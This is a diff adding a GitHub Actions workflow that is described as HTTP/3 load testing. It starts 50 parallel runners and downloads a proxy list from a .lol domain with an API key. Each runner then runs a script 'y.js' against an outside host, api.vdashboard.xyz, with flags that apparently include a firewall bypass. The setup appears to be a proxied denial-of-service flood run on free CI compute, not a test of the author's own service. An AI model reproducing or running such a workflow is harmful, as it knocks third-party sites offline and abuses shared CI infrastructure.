@@ -1,0 +1,56 @@
+name: Parallel Node.js Execution
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  parallel-execution-ubuntu:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 100
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+      
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-pip python3-dev build-essential libssl-dev
+          python3 --version
+          pip3 --version
+      
+      - name: Install Python packages for HTTP/3 load testing
+        run: |
+          pip3 install --upgrade pip
+          pip3 install aioquic uvloop
+      
+      - name: Install Node.js dependencies
+        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser
+      
+      - name: Download proxies
+        run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+      
+      - name: Run HTTP/3 load tester (if Python script exists)
+        run: |
+          node y.js GET https://api.vdashboard.xyz/ 700 4 100 --debug --bfw
+        env:
+          INSTANCE_NUMBER: ${{ matrix.instance }}
+          TOTAL_INSTANCES: 50
+          RUNNER_OS: ubuntu
